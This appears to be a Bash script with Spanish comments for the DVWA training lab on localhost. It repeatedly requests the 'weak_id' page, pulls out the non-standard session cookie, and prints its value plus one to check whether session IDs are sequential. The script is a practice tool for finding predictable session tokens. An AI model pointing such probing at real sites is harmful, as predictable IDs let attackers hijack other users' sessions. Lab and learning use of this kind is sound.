#!/bin/bash
URL="http://localhost/DVWA/vulnerabilities/weak_id/"
PHPSESSID="$1"  # Tu sesión actual
COOKIES="PHPSESSID=$PHPSESSID; security=low"

echo "🔍 Analizando cookies en $URL"

for i in {1..5}; do
    # Enviar petición y guardar TODAS las cookies
    ALL_COOKIES=$(curl -v -H "Cookie: $COOKIES" "$URL?generate=true" 2>&1 | grep -i 'set-cookie')
    
    # Mostrar todas las cookies recibidas (para depuración)
    echo "---- Intento $i ----"
    echo "$ALL_COOKIES"
    
    # Buscar cualquier cookie que pueda ser la débil (no PHPSESSID ni security)
    WEAK_COOKIE=$(echo "$ALL_COOKIES" | grep -i 'set-cookie' | grep -vi -E 'PHPSESSID|security' | head -1)
    
    if [ -n "$WEAK_COOKIE" ]; then
        COOKIE_NAME=$(echo "$WEAK_COOKIE" | sed -E 's/.* ([^ =]+)=([^;]+).*/\1/')
        COOKIE_VALUE=$(echo "$WEAK_COOKIE" | sed -E 's/.* ([^ =]+)=([^;]+).*/\2/')
        echo "✅ Posible cookie vulnerable encontrada:"
        echo "   Nombre: $COOKIE_NAME"
        echo "   Valor: $COOKIE_VALUE"
        echo "   Patrón: $((COOKIE_VALUE + 1))"  # Prueba de secuencia
    else
        echo "❌ No se encontraron cookies vulnerables"
    fi
    
    sleep 1
done
